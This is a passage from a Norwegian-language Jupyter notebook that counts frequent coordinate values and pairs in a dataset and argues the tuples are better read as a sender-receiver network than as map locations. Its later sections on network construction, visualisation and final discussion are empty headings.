    "print(f\"De 10 mest brukte y-koordinatene: (koordinat, frekvens)\\n{Counter(y_coords).most_common(10)}\")\n",
    "print(f\"De 5 mest brukte koordinatparene: ((x-koord, y-koord), frekvens)\\n{Counter(all_pairs).most_common(5)}\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "6353204b",
   "metadata": {},
   "source": [
    "På tvers av mengdene med tupler benyttes noe tupler og tall mer enn andre, noe som kan indikere viktighet. Dersom man anser tuplene som koordinater er det kun gjentagende koordinatpar som har relevans, men her var det kun en håndfull som var gjentatt to ganger, mens resten er unike forekomster. Jeg velger å tolke dette som om at datasettet ikke består av kartlokasjoner, fordi man da gjerne vil se \"hotspots\", noe vi ikke har her. Hvis man derimot velger å se på dataene som et nettverk blir ting mer spennende. F. eks. kan x-koordinatet være sender og y mottaker. X-er og y-er med høy frekvens kan anses som viktigere eller mer \"sentrale\" i nettverket. Her kan en nettverksvisualisering hjelpe oss med å tolke dataene. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f8da8bb1",
   "metadata": {},
   "outputs": [],
   "source": [
    "dual_presence = []\n",
    "for coord in set(x_coords): \n",
    "    if coord in set(y_coords): \n",
    "        dual_presence.append(coord)\n",
    "print(f\"Det er {len(dual_presence)} tall som dukker opp både som x- og y-koordinat\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5e3debb1",
   "metadata": {},
   "source": [
    "Disse 18 tallene kan f.eks både være sendere (eller selgere) og mottakere (eller kjøpere) i nettverket."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9236eb20",
   "metadata": {},
   "source": [
    "### Nettverkskonstruksjon"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "936c5236",
   "metadata": {},
   "source": [
    "### Visualisering"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9683ac06",
   "metadata": {},
   "source": [
    "### Endelig analyse og drøfting"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "588a4956",
   "metadata": {},
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
